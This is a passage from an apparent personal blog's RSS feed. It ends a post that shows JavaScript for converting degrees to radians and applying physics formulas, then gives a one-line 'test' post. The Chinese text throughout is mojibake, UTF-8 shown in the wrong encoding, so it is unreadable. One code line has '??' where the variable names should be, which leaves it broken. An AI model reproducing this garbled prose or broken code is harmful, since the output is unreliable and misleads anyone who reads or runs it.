      var pi = 3.14159265359;//ÂïèÂ∞±ÊòØjsÂÖßÂª∫ÊòØÁî®rad
...Á≠âÁ≠âÁ≠âÁ≠âÔΩû
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;degËΩârad&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;var ?? = ?? * Math.cos(theta * pi / 180.0);~~~
...Á≠âÁ≠âÁ≠âÁ≠âÔΩû
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Â∏∂ÂÖ•Êõ¥Â§öÁâ©ÁêÜÂÖ¨ÂºèÔΩûÔΩûÔΩû&lt;/li&gt;
&lt;li&gt;Êé®ÂÖ•ÊØèÂÄãÊôÇÈñìÈªûÔΩûÔΩûÔΩû&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;ÂÖ∂‰ªñÈÉΩË∑ü‰∏äÈù¢ÁöÑ‰∏ÄÊ®£&lt;/code&gt;~~~~&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Fri, 23 Jun 2023 16:00:00 GMT</pubDate></item><item><title>Ê∏¨Ë©¶</title><link>https://yih-0118.github.io/blog/%E6%B8%AC%E8%A9%A6/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/%E6%B8%AC%E8%A9%A6/</guid><description>Ê∏¨Ë©¶</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/%E6%B8%AC%E8%A9%A6/&quot;&gt;https://yih-0118.github.io/blog/%E6%B8%AC%E8%A9%A6/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;ÈÄôÂè™ÊòØ‰∏ÄÂÄãÊ∏¨Ë©¶&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Thu, 11 May 2023 16:00:00 GMT</pubDate></item></channel></rss>